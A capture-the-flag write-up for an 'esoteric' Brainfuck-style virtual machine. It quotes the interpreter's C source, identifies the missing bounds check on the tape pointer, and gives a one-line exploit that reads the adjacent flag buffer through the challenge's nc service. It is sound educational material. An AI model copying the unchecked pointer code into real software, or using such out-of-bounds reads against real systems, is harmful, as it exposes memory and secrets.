esoteric
========

## Challenge info:

`esoteric` is a virtual machine that's controlled by `esoteric-lang`. You can read more documentation about it at http://challenges.matrix8.net/esoteric/.
There's a virtual machine running on the host below, and we've managed to capture the source code to the virtual machine. There are problems with this virtual machine though. Can you exploit it and get the flag?
Connect using your CTF shell: `nc challenges.ctfd.io 30128`

## Solution:

Reviewing the documentation reveals `esoteric` to be a fairly rudimental language, conceptually similar to a Turing machine - increment/decrement/print a byte, move along a tape of sorts and simple looping. Looking at the code shows it merely generates and runs an abstract syntax tree from the submitted code, so let's take a look at the run function:
```c
void run_ast(struct node *prog) {
	char f[256] = {0};
	char cells[500] = {0};
	char *ip = cells;

	flag(f);

	while (prog != NULL) {
		switch (prog->type) {
			// cell value ops
			case TOK_CELL_INC: ++*ip; break;
			case TOK_CELL_DEC: --*ip; break;

			// instruction pointer ops
			case TOK_IP_INC: ++ip; break;
			case TOK_IP_DEC: --ip; break;

			// i/o ops
			case TOK_PRINT_CHAR: putchar(*ip); break;

			// loop ops
			case TOK_LOOP:	if (*ip != 0) prog = prog->body; break;
			case TOK_LOOP_END:	
				while (prog->prev != NULL) prog = prog->prev;
				if (*ip == 0) prog = prog->parent;
				break;

			default: ;
		}
		prog = prog->next;
	}
}
```
There's nothing special about this function - store the flag and the interpreter tape in their respective arrays and handle program logic. The code for moving the pointer to the current cell, however, doesn't prevent moving the pointer off of the tape entirely:
```c
// instruction pointer ops
case TOK_IP_INC: ++ip; break;
case TOK_IP_DEC: --ip; break;
```
Knowing that, it should be possible to read any desired location in memory, including that of the flag:
```
$ python -c 'print("}" * 499 + "}!" * 65 + "\n")' | nc challenges.ctfd.io 30128
esoteric REPL v0.1
> Equifax{no_bounds_checking_in_the_esoteric_virtual_machine_oops}
```
P.S. You could paste the code for this challenge into [Compiler Explorer](https://godbolt.org/) as well to check how close the arrays were in memory, but the cells array and the flag array don't seem to be contiguous in memory until you pass the -O2 compiler option; this makes the resulting code far more difficult to parse if you've never experienced x86 assembly before - I have a basic knowledge and it took me a good while before I convinced myself the two arrays were next to each other.
